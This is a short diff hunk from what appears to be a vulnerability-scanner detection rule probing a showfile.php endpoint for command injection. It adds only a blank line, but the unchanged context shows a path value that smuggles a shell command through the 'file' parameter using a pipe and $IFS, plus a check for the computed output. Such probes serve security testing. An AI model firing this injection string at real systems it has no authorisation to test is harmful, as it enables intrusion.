@@ -7,3 +7,4 @@ rules:
     path: /showfile.php?file=|expr$IFS"{{r1}}"$IFS-$IFS"{{r2}}"
     follow_redirects: false
     expression: response.body.bcontains(bytes(string(r1 - r2)))
+    
